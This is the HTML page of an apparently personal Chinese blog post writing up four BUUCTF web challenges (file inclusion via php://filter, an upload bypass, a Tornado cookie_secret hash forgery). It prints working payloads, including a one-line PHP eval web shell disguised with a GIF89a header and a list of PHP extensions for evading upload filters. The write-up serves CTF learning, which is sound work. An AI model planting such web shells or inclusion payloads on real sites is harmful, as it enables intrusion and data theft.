@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="继续碎碎念：今天一定要写完16篇！（可能做梦会快一点） 5.[极客大挑战 2019]Secret File打开是这个亚子  说实话 对他的秘密没啥兴趣 啥也没有 日常看源码 发现有东西  然后访问 ：.&#x2F;&#x2F;Archive_room.php 发现一个bottom 点击它 跳转到：  根据他让回去看 和两个页面跳转 猜测存在302页面 用bp抓包  果然  之后访问 .&#x2F;&#x2F;secr3t.php  根据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuwp2">
+<meta property="og:url" content="http://yoursite.com/2020/08/30/buuwp2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="继续碎碎念：今天一定要写完16篇！（可能做梦会快一点） 5.[极客大挑战 2019]Secret File打开是这个亚子  说实话 对他的秘密没啥兴趣 啥也没有 日常看源码 发现有东西  然后访问 ：.&#x2F;&#x2F;Archive_room.php 发现一个bottom 点击它 跳转到：  根据他让回去看 和两个页面跳转 猜测存在302页面 用bp抓包  果然  之后访问 .&#x2F;&#x2F;secr3t.php  根据">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzV4Ld.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzVvLj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzZmwR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzZ1SO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzZt0A.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzZOtx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzndt1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzKvOU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzME6K.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/01/dzlWS1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/dz1m0U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/dz1YnK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/dz3GCj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/dzG7ut.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/dzJTG4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/dzY0yR.png">
+<meta property="article:published_time" content="2020-08-30T06:26:47.000Z">
+<meta property="article:modified_time" content="2020-09-01T17:20:56.022Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/09/01/dzV4Ld.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>buuwp2</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">Hexo</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/08/29/buuwp1/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/30/buuwp2/" target="_blank" rel="noopener"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/30/buuwp2/&text=buuwp2" target="_blank" rel="noopener"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/30/buuwp2/&is_video=false&description=buuwp2" target="_blank" rel="noopener"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=buuwp2&body=Check out this article: http://yoursite.com/2020/08/30/buuwp2/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/30/buuwp2/&name=buuwp2&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#5-极客大挑战-2019-Secret-File"><span class="toc-number">1.</span> <span class="toc-text">5.[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-ACTF2020-新生赛-Include"><span class="toc-number">2.</span> <span class="toc-text">6.[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-极客大挑战-2019-Upload"><span class="toc-number">3.</span> <span class="toc-text">7.[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-护网杯-2018-easy-tornado"><span class="toc-number">4.</span> <span class="toc-text">8.[护网杯 2018]easy_tornado</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        buuwp2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Hexo</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-08-30T06:26:47.000Z" itemprop="datePublished">2020-08-30</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>继续碎碎念：今天一定要写完16篇！（<del>可能做梦会快一点</del>）</p>
+<h1 id="5-极客大挑战-2019-Secret-File"><a href="#5-极客大挑战-2019-Secret-File" class="headerlink" title="5.[极客大挑战 2019]Secret File"></a>5.[极客大挑战 2019]Secret File</h1><p>打开是这个亚子</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzV4Ld.png" alt="dzV4Ld.png"></p>
+<p>说实话 对他的秘密没啥兴趣</p>
+<p>啥也没有 日常看源码 发现有东西</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzVvLj.png" alt="dzVvLj.png"></p>
+<p>然后访问 ：.//Archive_room.php</p>
+<p>发现一个bottom 点击它</p>
+<p>跳转到：</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzZmwR.png" alt="dzZmwR.png"></p>
+<p>根据他让回去看 和两个页面跳转 猜测存在302页面<br> 用bp抓包</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzZ1SO.png" alt="dzZ1SO.png"></p>
+<p>果然  之后访问 .//secr3t.php</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzZt0A.png" alt="dzZt0A.png"></p>
+<p>根据代码判断为文件包含漏洞</p>
+<p>存在简单过滤 但是没过滤filter</p>
+<p>patload :./secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</p>
+<p>得到一串字符：根据最后一个等号猜测base64编码</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzZOtx.png" alt="dzZOtx.png"></p>
+<p>得到flag :flag{37c604f2-2e0d-4fd6-820e-07796462026e}</p>
+<h1 id="6-ACTF2020-新生赛-Include"><a href="#6-ACTF2020-新生赛-Include" class="headerlink" title="6.[ACTF2020 新生赛]Include"></a>6.[ACTF2020 新生赛]Include</h1><p>打开发现是一个链接 直接点击链接跳转</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzndt1.png" alt="dzndt1.png"></p>
+<p>看url中发现文件包含</p>
+<p>和上题一样 用input 发现被过滤 用filter伪协议</p>
+<p>得到:PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZmMxMmI4YjAtMmRhZi00YjZhLWI2ZTUtZmNhOTZkY2Q1Yzg3fQo=</p>
+<p>base64解码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;fc12b8b0-2daf-4b6a-b6e5-fca96dcd5c87&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="7-极客大挑战-2019-Upload"><a href="#7-极客大挑战-2019-Upload" class="headerlink" title="7.[极客大挑战 2019]Upload"></a>7.[极客大挑战 2019]Upload</h1><p>哦一道有趣的上传题</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzKvOU.png" alt="dzKvOU.png"></p>
+<p>这个图片还挺好看</p>
+<p>随便上传一个图片</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzME6K.png" alt="dzME6K.png"></p>
+<p>告诉我这不是图片 要上传图片</p>
+<p>然后顺理成章的懵逼了</p>
+<p>找大佬的wp </p>
+<p>涨姿势：</p>
+<p>某些情况下绕过后缀名检测：</p>
+<p>php,php3,php4,php5,phtml.pht</p>
+<p>常用一句话木马：</p>
+<p>GIF89a? <code>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code></p>
+<p>还有大佬总结的知识点：<a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+<p>开始做题：</p>
+<p>bp抓包做如下修改 上传一句话木马</p>
+<p><img src="https://s1.ax1x.com/2020/09/01/dzlWS1.png" alt="dzlWS1.png"></p>
+<p>然后蚁剑链接 获取flag</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/dz1m0U.png" alt="dz1m0U.png"></p>
+<p>链接地址：58b8a1ae-21e9-43ba-99df-093e9c046f4d.node3.buuoj.cn/upload/robot.phtml</p>
+<p>文件太多了 直接虚拟终端找flag</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/dz1YnK.png" alt="dz1YnK.png"></p>
+<p>得到flag：flag{e31cdd99-0057-421e-b22c-726fe4596afd}</p>
+<h1 id="8-护网杯-2018-easy-tornado"><a href="#8-护网杯-2018-easy-tornado" class="headerlink" title="8.[护网杯 2018]easy_tornado"></a>8.[护网杯 2018]easy_tornado</h1><p>打开之后是三链接：</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/dz3GCj.png" alt="dz3GCj.png"></p>
+<p>挨个点开看看</p>
+<p>分别是：</p>
+<ul>
+<li><p>/flag.txt</p>
+<p> flag in /fllllllllllllag</p>
+</li>
+<li><p>/welcome.txt</p>
+<p>render</p>
+</li>
+<li><p>/hints.txt</p>
+<p>md5(cookie_secret+md5(filename)) </p>
+</li>
+</ul>
+<p>qaq 它好像想表达什么 但是我get 不到</p>
+<p>第一个告诉了flag的位置</p>
+<p>第二个是啥布吉岛 （查一下知道是一个函数的名字}</p>
+<p>第三个告诉了一个奇奇怪怪的md5 一定有用 有啥用暂且还不知道</p>
+<p>同时不要忘了第四条提示： tornado （一个python web 框架）</p>
+<p>那就开始做题</p>
+<p>头铁瞎访问<br>发现一个error页面</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/dzG7ut.png" alt="dzG7ut.png"></p>
+<p>好像并没有什么卵用</p>
+<p>康康那个render函数</p>
+<p>render函数是渲染一个视图，然后提供给el挂载，如果没有render那页面什么都不会出来</p>
+<p>试试mag=nishizhu</p>
+<p>哦 很顺利的 说明存在注入</p>
+<p>尝试0 出现orz </p>
+<p>对不起 我也想发 Orz<br>感谢它说出了心声？?（迷惑）</p>
+<p>只好查看官方文档(<del>wp</del>)</p>
+<p>链接：<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax</a></p>
+<p>终于在一个不起眼的小角落（Tornado框架的附属文件handler.settings中存在cookie_secret）找到了我的cookie_secret</p>
+<p>然后开始：</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/dzJTG4.png" alt="dzJTG4.png"></p>
+<p>得到那个cookie_secret：adfdc8df-ac6f-431c-bfc8-35426e023388</p>
+<p>还缺一个fliename :  flag in /fllllllllllllag</p>
+<p>然后就是简单（<del>才怪</del>）的python脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename&#x3D;&#39;&#x2F;fllllllllllllag&#39;</span><br><span class="line">cookie_secret&#x3D;&quot;adfdc8df-ac6f-431c-bfc8-35426e023388&quot;</span><br><span class="line">hash.update(filename.encode(&#39;utf-8&#39;))</span><br><span class="line">s1&#x3D;hash.hexdigest()</span><br><span class="line">hash &#x3D; hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure>
+
+<p>得到：29592b045ccd25b6bd87f7ac3c81b942</p>
+<p>然后payload :./file?filename=/fllllllllllllag&amp;filehash=29592b045ccd25b6bd87f7ac3c81b942</p>
+<p><a href="https://imgchr.com/i/dzY0yR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/02/dzY0yR.png" alt="dzY0yR.png"></a></p>
+<p>得到flag :flag{c07d5ef8-c2b2-444e-86cb-6ecf8814208d}</p>
+<p>没电了 明天一定写完 我太难了</p>
+<p>支持我写完的动力只有对面小姐姐在打游戏 我睡不着  她依旧在打游戏 啊啊啊</p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#5-极客大挑战-2019-Secret-File"><span class="toc-number">1.</span> <span class="toc-text">5.[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-ACTF2020-新生赛-Include"><span class="toc-number">2.</span> <span class="toc-text">6.[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-极客大挑战-2019-Upload"><span class="toc-number">3.</span> <span class="toc-text">7.[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-护网杯-2018-easy-tornado"><span class="toc-number">4.</span> <span class="toc-text">8.[护网杯 2018]easy_tornado</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/30/buuwp2/" target="_blank" rel="noopener"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/30/buuwp2/&text=buuwp2" target="_blank" rel="noopener"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/30/buuwp2/&is_video=false&description=buuwp2" target="_blank" rel="noopener"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=buuwp2&body=Check out this article: http://yoursite.com/2020/08/30/buuwp2/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/30/buuwp2/&title=buuwp2" target="_blank" rel="noopener"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/30/buuwp2/&name=buuwp2&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
